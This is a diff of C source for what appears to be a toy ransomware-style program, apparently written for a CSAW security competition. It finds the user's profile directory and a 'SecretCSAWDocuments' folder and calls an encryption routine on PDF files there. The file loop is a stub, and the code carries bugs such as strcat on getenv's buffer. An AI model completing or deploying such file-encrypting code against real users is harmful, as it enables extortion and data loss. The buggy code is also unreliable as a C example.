@@ -8,7 +8,10 @@
 #include <openssl/sha.h>
 #include <string.h>
 #include <windows.h>
+#include <winbase.h>
 #include <openssl/rand.h>
+#include <Lmcons.h>
+#include <shlwapi.h>
 
 #define ERR_EVP_CIPHER_INIT -1
 #define ERR_EVP_CIPHER_UPDATE -2
@@ -182,7 +185,21 @@ int inkripshun(FILE *infile, Struct *mats){
 // Find directory function
 // Don't forget to catch "Directory Not Found"!
 const char* chekDirectoree(){
-    
+
+    // Get user's logon name
+    char userName[UNLEN+1];
+    //char targitDirectoree[MAX_PATH];
+    //targitDirectoree 
+    char * targitDirectoree = strcat(getenv("USERPROFILE"),"\\SecretCSAWDocuments\\");
+
+    //printf("MAX_PATH = %d\n", MAX_PATH);
+    LPDWORD pcbBuffer;
+    DWORD length = UNLEN + 1;
+    pcbBuffer = &length;
+    WINBOOL gotUserName = GetUserName(userName, pcbBuffer);
+    printf("User name: %s\n", userName);
+    printf("Home directory is %s\n", getenv("USERPROFILE"));
+    printf("Checking Directory %s\n", targitDirectoree);
 };
 
 // Check PDF function
@@ -200,17 +217,18 @@ int main(){
     Struct key_iv = Gin();
 
     // Check CWD name
-    const char* directoryPath = chekDirectoree();
+    const char* directoryPath = strcat(getenv("USERPROFILE"),"\\SecretCSAWDocuments\\");
 
-    if (directoryPath != "Not Found") {
+    if (PathFileExistsA(directoryPath)) {
         // Loop through files in directory
-         nextFile = NULL;
+        nextFile = NULL;
         
         // Check if PDF?
         if (isPDF(nextFile)){
             // Encrypt
-                inkripshun(nextFile, &key_iv);
+            inkripshun(nextFile, &key_iv);
         };
-    };
-
+    } else {
+        printf("Did not find the CSAW secret directory.\n");
+    }
 };
